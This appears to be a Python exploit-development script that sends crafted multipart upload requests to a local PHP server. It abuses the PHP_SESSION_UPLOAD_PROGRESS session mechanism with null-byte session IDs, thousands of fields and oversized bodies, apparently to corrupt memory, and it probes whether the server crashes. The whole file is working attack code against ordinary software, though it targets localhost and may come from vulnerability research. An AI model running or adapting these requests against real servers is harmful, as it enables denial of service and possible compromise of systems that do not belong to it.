import sys, time
sys.path.insert(0, r"C:\Users\likat\p2s52704")
from exploit import Target, build_multipart, parse_cookie
t = Target("http://127.0.0.1:18113/index.php", timeout=120, verbose=False)
SID = b"attacksessionid0001"
def filepart(): return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

def rotate():
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), {"name": "big", "data": b"B" * (12 * 1024 * 1024)}]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.3)
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20)
    time.sleep(0.5)

def stage2_reqb():
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(983):
        cnt = 16 if i == 406 else 1
        for j in range(cnt):
            parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * 16})
    return t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20)

# Test: 39-byte fields WITHOUT big field (no OOM) - does it crash?
for nfields in [100, 500, 1001]:
    rotate()
    parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(nfields)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart()]
    # NO big field
    resp = t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    if b"\r\n\r\n" in resp:
        head, body = resp.split(b"\r\n\r\n", 1)
    else:
        head, body = b"", resp
    print(f"nfields={nfields} (no big): resp={len(resp)}B Set-Cookie={b'Set-Cookie' in head} body={len(body)}B")
    time.sleep(0.3)
